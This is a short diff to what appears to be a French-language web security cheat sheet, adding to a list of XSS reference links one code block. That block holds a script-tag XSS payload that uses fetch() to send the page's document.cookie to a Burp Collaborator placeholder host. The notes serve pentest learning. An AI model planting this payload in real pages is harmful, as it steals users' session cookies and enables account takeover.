@@ -539,6 +539,10 @@ Header Set-Cookie: mettre le scope de l'attribut SameSite = None
  - https://learn-cyber.net/article/Reflected-XSS-Attacks
  - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
+```js
+<script>fetch('https://<SESSION>.burpcollaborator.net/?'+document.cookie);</script>
+```
+
 ### Filters bypass
 
  - https://javascript.info/script-async-defer
